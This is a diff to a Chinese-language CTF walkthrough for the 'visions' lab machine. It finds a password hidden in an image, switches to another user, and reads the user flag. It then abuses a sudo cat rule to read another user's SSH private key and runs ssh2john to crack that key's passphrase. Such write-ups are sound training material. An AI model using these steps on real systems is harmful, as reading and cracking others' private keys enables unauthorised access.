@@ -72,5 +72,30 @@ cat: user.txt: Permission denied
 
 ```
 可以看到home目录下还有好多其他用户，这里脑洞较为大，还得回到那张图片white.png
-把它复制到windows的world里，图片格式-->矫正-->
-sophia/seemstobeimpossible
+把它复制到windows的world里，图片格式-->矫正-->图片矫正选项-->对比度-56%，就能看到账户密码
+
+>sophia/seemstobeimpossible
+
+获得第一个flag
+```C
+emma@visions:/home/sophia$ su sophia
+su sophia
+Password: seemstobeimpossible
+
+sophia@visions:~$ cat user.txt
+cat user.txt
+hmvicanseeforever
+
+```
+
+读取到ssh私钥
+```c
+sudo -l ///usr/bin/cat /home/isabella/.invisible
+sudo /usr/bin/cat /home/isabella/.invisible
+```
+
+将私钥复制出来，这登录还需要密码，我们使用 **ssh2john** 将 **id_isa** 秘钥信息 转换 为 **john** 可以识别的hash，然后进行爆破
+```C
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ ssh2john id_rsa >> hash  
+```
